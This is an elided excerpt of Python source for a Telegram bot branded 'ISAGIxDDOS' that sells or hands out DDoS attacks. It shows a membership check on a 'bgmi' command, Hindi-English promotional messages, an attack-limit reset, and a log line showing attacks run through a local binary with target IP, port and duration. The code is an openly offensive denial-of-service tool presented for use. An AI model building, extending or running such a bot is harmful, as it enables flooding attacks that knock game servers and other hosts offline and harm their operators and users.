...
def reset_attack_limit(message):
    owner_id = 6353114118  # Replace with the actual owner ID
    ...
    response = (
        ...
        "━━━━━━━━━━━━━━━━━━━\n"
        "🔗 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬: [ISAGI](@ddosgroupbyzodvik) ⚡*"
    )
...
FEEDBACK_CHANNEL_ID = "-1002364415379"  # Replace with your actual feedback channel ID
...
def bgmi_command(message):
    ...
    try:
        ...
        if user_status not in ["member", "administrator", "creator"]:
            bot.send_message(
                message.chat.id,
                " *ISAGIxDDOS 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗‼️* \n\n"
                "🖤*BHAI PHLE JOIN KAR LE USE KAR NE KE LIYE*🖤\n\n"
                "📢 *LET'S GO AND JOIN CHANNEL*\n"
                f" [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](buttonurl)(https://t.me/ISAGIxFEEDBACK)\n\n"
    ...
    try:
        ...
        logging.info(f"Attack started by {user_name}: ./BHAIYA {target_ip} {target_port} {default_duration} 1200")
